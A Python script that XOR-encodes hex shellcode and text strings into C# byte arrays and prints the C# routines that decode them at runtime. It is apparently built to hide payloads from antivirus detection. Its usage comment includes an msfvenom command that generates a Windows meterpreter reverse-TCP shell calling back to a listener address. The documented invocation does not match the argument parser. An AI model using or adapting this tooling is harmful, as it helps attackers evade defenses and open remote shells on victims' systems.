#!/usr/bin/env python3

'''
Author: @theBlazz3
Shellcode XOR encodind script

Usage:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.133 LPORT=443 EXITFUNC=thread -f hex -o shellcode.hex
python3 xor-encoder.py shellcode.hex
'''

import os
import sys
import argparse
from random import choice
from string import ascii_letters, digits
from colorama import init
from termcolor import colored, cprint

init()

#################################
# Generate a random ascii_letters + digits string
#################################
def gen_random_string(length):
    return ''.join([choice(ascii_letters + digits) for x in range(length)])

#################################
# XOR Encoder
#################################
def xorEncrypt(data: bytes(), key):
    l = len(key)
    keyAsInt = list(map(ord, key))
    xored = bytes(bytearray((
        (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))
    )))
    return xored.hex()

#################################
# Create shellcode byte array
#################################
def createCsharpByteArray(xored_bytes, var_name):
    buf = ''
    for i in bytearray.fromhex(xored_bytes):
        j = i
        buf += '0x'
        buf += '%02x,' %j
    buf = buf[:-1]
    byte_len = buf.count("0x")
    crafted_csharpbytearray = "byte[] %s = new byte[%d] {%s};"%(var_name, byte_len, buf)
    return crafted_csharpbytearray

#################################
# Main
#################################
def main(args):
    
    cprint(colored('\nXOR Encoder by @theBlazz3', 'red'))

    key = gen_random_string(16)
    cprint(colored('\n[+] XOR Key: {}'.format(key), 'green'))
    cprint(colored('\nstring key = "{}";'.format(key),'yellow'))
   
    if os.path.exists(args.i):
        with open(args.i, 'r') as data:
            print('\n=================================')
            print('\n[+] XOR encoding hex shellcode...')
            print('\n=================================')
            cprint(colored('\n[+] C# xorDecodeBytes routine: ', 'magenta'))
            dec_routine = """
private static byte[] xorDecodeBytes(byte[] encrypted, string key)
{
    byte[] decrypted = new byte[encrypted.Length];
    for (int i = 0; i < encrypted.Length; i++)
    {
        decrypted[i] = (byte)((uint)encrypted[i] ^ key[i % key.Length]);
    }
    return decrypted;
}            
"""
            cprint(dec_routine, 'yellow')
            xored_shellcode = xorEncrypt(bytes.fromhex(data.read()), key)
            bytearray_name = 'shellcode_buf'
            crafted_payload = createCsharpByteArray(xored_shellcode, bytearray_name)
            cprint(colored('[+] XOR encoded shellcode C# Byte Array: \n','magenta'))
            cprint(colored(crafted_payload, 'yellow'))
            cprint(colored('\n[+] C# shellcode decoding:','magenta'))
            dec_shellcode = '\nbyte[] buf = xorDecodeBytes({}, key);\n'.format(bytearray_name)
            cprint(colored(dec_shellcode, 'yellow'))
            print('[+] Done!\n')
    else:
        print('[x] Input file does not exist, try again.')
        quit()

    if (args.s != None):
            if (os.path.exists(args.s)):
                with open(args.s, 'r') as data:
                    print('\n=======================================')
                    print('\n[+] XOR encoding strings in {}...'.format(args.s))
                    print('\n=======================================')
                    cprint(colored('\n[+] C# xorDecodeString routine: ', 'magenta'))
                    dec_routine = """
private static string xorDecodeString(byte[] encrypted, string key)
{
    string decrypted = "";
    for (int i = 0; i < encrypted.Length; i++)
    {
        decrypted += (char)((uint)encrypted[i] ^ key[i % key.Length]);
    }
    return decrypted;
}
"""
                    cprint(dec_routine, 'yellow')
                    for index, line in enumerate(data):
                        linebytes = line.strip().encode('utf-8')
                        linebytes_hex = linebytes.hex()
                        xored_string = xorEncrypt(bytes.fromhex(linebytes_hex), key)
                        original_string = line.strip()
                        cprint(colored('[+] Original string [{}]: {}'.format(index+1, original_string), 'green'))
                        stringbytearray_name = 'string_bytearray_' + gen_random_string(6)
                        crafted_string = createCsharpByteArray(xored_string, stringbytearray_name)
                        cprint(colored('\n[+] XOR encoded C# Byte Array: \n', 'magenta'))
                        cprint(colored(crafted_string, 'yellow'))
                        rand_string = gen_random_string(6)
                        cprint(colored('\n[+] C# string decoding: ', 'magenta'))
                        dec_string = '\nstring decoded_string_{} = xorDecodeString({}, key);\n'.format(gen_random_string(6), stringbytearray_name)
                        cprint(colored(dec_string, 'yellow'))
                    print('[+] Done!\n')
            else:
                print('[x] Input strings file does not exist, try again.')
                quit()

if __name__ == '__main__':
    args = argparse.ArgumentParser(description='\nXOR Encoder by @theBlazz3', usage='python3 %(prog)s shellcode.hex -s strings.txt')
    args.add_argument('-i', metavar='FILE', help='Input hex shellcode file', type=str)
    args.add_argument('-s', metavar='FILE', help='Input strings file', type=str)
    args_p = args.parse_args()
    if ((args_p.i == None) and (args_p.s == None)):
        args.print_help()
        quit()
    else:
        main(args_p)